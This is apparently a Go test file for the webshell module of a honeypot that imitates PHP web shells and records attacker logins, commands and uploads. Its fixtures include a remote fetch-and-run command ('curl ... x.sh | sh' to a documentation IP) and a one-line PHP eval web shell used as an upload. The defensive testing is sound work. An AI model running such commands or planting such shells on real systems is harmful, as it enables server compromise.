package webshell

import (
	"bytes"
	"mime/multipart"
	"net/http/httptest"
	"slices"
	"strings"
	"testing"

	"agenttrap/modules"
)

func req(method, target, surface string, body string) modules.Request {
	r := httptest.NewRequest(method, target, strings.NewReader(body))
	if body != "" {
		r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	return modules.Request{Request: r, Surface: surface}
}

func TestClaim(t *testing.T) {
	m := New()
	cases := []struct {
		target, surface string
		want            modules.Claim
	}{
		{"http://203.0.113.9/alfa.php", "", modules.Attack},
		{"https://www.demogpu.example/wp-content/plugins/hellopress/wp_filemanager.php", "www", modules.Attack},
		{"http://203.0.113.9/NPJcpMFsDNB.php", "", modules.Attack},
		{"http://203.0.113.9/BDKRNWP.php", "", modules.Attack},
		{"http://203.0.113.9/1234.php", "", modules.Attack},
		{"http://203.0.113.9/f3.php", "", modules.Attack},
		{"http://203.0.113.9/icecoder/lib/terminal-xhr.php", "", modules.Attack},
		{"http://203.0.113.9/index.php?cmd=id", "", modules.Attack},
		{"http://203.0.113.9/index.php", "", modules.Pass},
		{"http://203.0.113.9/wp-login.php", "", modules.Pass},
		{"http://203.0.113.9/phpinfo.php", "", modules.Pass},
		{"http://203.0.113.9/configuration.php", "", modules.Pass},
		{"http://203.0.113.9/alfa.html", "", modules.Pass},
		{"https://api.demogpu.example/alfa.php", "api", modules.Pass},
		{"https://aws.demogpu.example/shell.php", "aws", modules.Pass},
	}
	for _, c := range cases {
		if got := m.Claim(req("GET", c.target, c.surface, "")); got != c.want {
			t.Errorf("%s (%q): claim %v want %v", c.target, c.surface, got, c.want)
		}
	}
}

func TestDiscoveryLoginCommand(t *testing.T) {
	m := New()
	w := httptest.NewRecorder()
	hit := m.Serve(w, req("GET", "http://203.0.113.9/alfa.php", "", ""))
	if hit.Stage != modules.StageProbe || !strings.Contains(w.Body.String(), `type="password"`) || w.Header().Get("X-Powered-By") != "PHP/8.4.26" {
		t.Fatalf("discovery: %+v %q", hit, w.Body.String())
	}

	w = httptest.NewRecorder()
	hit = m.Serve(w, req("POST", "http://203.0.113.9/alfa.php", "", "pass=hunter2"))
	if hit.Stage != modules.StageExploit || hit.Detail["password"] != "hunter2" || !strings.Contains(w.Header().Get("Set-Cookie"), "PHPSESSID") {
		t.Fatalf("login: %+v", hit)
	}

	w = httptest.NewRecorder()
	hit = m.Serve(w, req("POST", "http://203.0.113.9/wso.php", "", "a=Console&p1="+
		"id%3B+uname+-a%3B+curl+-s+http%3A%2F%2F198.51.100.7%2Fx.sh+%7C+sh"))
	if hit.Stage != modules.StageExploit || !strings.Contains(hit.Detail["command"].(string), "curl -s http://198.51.100.7/x.sh") {
		t.Fatalf("command: %+v", hit)
	}
	if urls, _ := hit.Detail["urls"].([]string); !slices.Contains(urls, "http://198.51.100.7/x.sh") {
		t.Fatalf("urls: %v", hit.Detail["urls"])
	}
	body := w.Body.String()
	if !strings.Contains(body, "uid=33(www-data)") || !strings.Contains(body, "Linux web01 5.10.0-28-amd64") {
		t.Fatalf("output: %q", body)
	}

	w = httptest.NewRecorder()
	hit = m.Serve(w, req("GET", "http://203.0.113.9/shell.php?cmd=whoami", "", ""))
	if hit.Stage != modules.StageExploit || !strings.Contains(w.Body.String(), "www-data") {
		t.Fatalf("query command: %+v %q", hit, w.Body.String())
	}

	w = httptest.NewRecorder()
	hit = m.Serve(w, req("POST", "http://203.0.113.9/lib/terminal-xhr.php", "", "command=pwd"))
	if w.Body.String() != "/var/www/html\n" || w.Header().Get("Content-Type") != "text/plain; charset=UTF-8" {
		t.Fatalf("terminal-xhr: %q", w.Body.String())
	}
}

func TestUpload(t *testing.T) {
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	fw, _ := mw.CreateFormFile("f", "x.php")
	_, _ = fw.Write([]byte("<?php eval($_POST[1]); ?>"))
	_ = mw.Close()
	r := httptest.NewRequest("POST", "http://203.0.113.9/up.php", &buf)
	r.Header.Set("Content-Type", mw.FormDataContentType())
	w := httptest.NewRecorder()
	hit := New().Serve(w, modules.Request{Request: r})
	ups, _ := hit.Detail["uploads"].([]upload)
	if hit.Stage != modules.StageExploit || len(ups) != 1 || ups[0].Filename != "x.php" || len(ups[0].SHA256) != 64 ||
		!strings.Contains(w.Body.String(), "File uploaded") {
		t.Fatalf("upload: %+v %q", hit, w.Body.String())
	}
}
